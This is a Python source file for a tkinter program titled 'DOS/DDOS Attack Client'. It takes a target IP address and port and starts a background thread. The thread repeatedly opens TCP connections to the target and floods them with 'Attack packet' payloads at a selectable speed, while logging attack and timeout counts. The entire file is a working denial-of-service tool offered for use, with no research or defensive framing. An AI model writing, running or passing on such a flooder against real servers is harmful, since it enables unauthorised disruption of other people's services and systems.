import tkinter as tk
from tkinter import ttk
import socket
import threading
import time

# Global variables to control the attack
attack_thread = None
attack_running = False
attack_count = 0
attack_speed = 1  # Default attack speed
timeout_count = 0

def log_message(message):
    """Function to log messages to the Text widget."""
    log_text.config(state=tk.NORMAL)
    log_text.insert(tk.END, message + "\n")
    log_text.config(state=tk.DISABLED)
    log_text.see(tk.END)

def on_button1_click():
    """Start Attack button handler."""
    global attack_thread, attack_running
    if not attack_running:
        attack_running = True
        target_ip = entry_ip.get()
        target_port = int(entry_port.get())
        attack_thread = threading.Thread(target=run_attack, args=(target_ip, target_port))
        attack_thread.start()
        log_message("Attack started...")

def on_button2_click():
    """Stop Attack button handler."""
    global attack_running
    attack_running = False
    log_message("Attack stopped.")

def set_attack_speed(event):
    """Set attack speed based on selected option."""
    global attack_speed
    speed_option = speed_combobox.get()
    speed_map = {
        "Full Speed": 1000,
        "Slow": 0.1,
        "Medium": 0.5,
        "Fast": 1,
        "Ultra Speed": 10
    }
    attack_speed = speed_map.get(speed_option, 1)  # Default to 1 if option not found

def update_stats():
    """Update the stats labels."""
    attack_count_label.config(text=f"Attack Count: {attack_count}")
    timeout_count_label.config(text=f"Timeout Count: {timeout_count}")
    root.after(1000, update_stats)  # Update stats every second

def run_attack(target_ip, target_port):
    """Attack function to simulate DOS attack."""
    global attack_count, timeout_count
    while attack_running:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)  # Set a timeout for connection attempts
                s.connect((target_ip, target_port))
                for _ in range(100):  # Send multiple packets per connection
                    s.sendall(b'Attack packet')
                    attack_count += 1
                    log_message(f"Attack Count {attack_count}")
                    if attack_speed > 0:
                        time.sleep(1 / attack_speed)  # Delay based on selected speed
        except socket.timeout:
            log_message("Server connection timeout.")
            timeout_count += 1
        except BrokenPipeError:
            log_message("Too much traffic.")
            timeout_count += 1
        except Exception as e:
            pass  # Suppress other errors

# GUI setup
root = tk.Tk()
root.title("DOS/DDOS Attack Client")

# Target IP address entry
label_ip = tk.Label(root, text="Target IP:")
label_ip.grid(row=0, column=0, padx=10, pady=10, sticky="W")

entry_ip = tk.Entry(root)
entry_ip.grid(row=0, column=1, padx=10, pady=10, sticky="W")

# Target port entry
label_port = tk.Label(root, text="Target Port:")
label_port.grid(row=1, column=0, padx=10, pady=10, sticky="W")

entry_port = tk.Entry(root)
entry_port.grid(row=1, column=1, padx=10, pady=10, sticky="W")

# Speed selection
label_speed = tk.Label(root, text="Attack Speed:")
label_speed.grid(row=2, column=0, padx=10, pady=10, sticky="W")

speed_combobox = ttk.Combobox(root, values=["Full Speed", "Slow", "Medium", "Fast", "Ultra Speed"])
speed_combobox.grid(row=2, column=1, padx=10, pady=10, sticky="W")
speed_combobox.bind("<<ComboboxSelected>>", set_attack_speed)

# Create two buttons
button1 = tk.Button(root, text="Start Attack", command=on_button1_click)
button1.grid(row=3, column=1, padx=10, pady=10, sticky="NSEW")

button2 = tk.Button(root, text="Stop Attack", command=on_button2_click)
button2.grid(row=4, column=0, padx=10, pady=10, sticky="W")

# Log Text widget
log_text = tk.Text(root, height=10, width=50, state=tk.DISABLED)
log_text.grid(row=5, column=0, columnspan=2, padx=10, pady=10)

# Attack count label
attack_count_label = tk.Label(root, text="Attack Count: 0")
attack_count_label.grid(row=6, column=0, padx=10, pady=10, sticky="W")

# Timeout count label
timeout_count_label = tk.Label(root, text="Timeout Count: 0")
timeout_count_label.grid(row=6, column=1, padx=10, pady=10, sticky="W")

# Start the stats updater
root.after(1000, update_stats)  # Update stats every second

# Start the GUI event loop
root.mainloop()
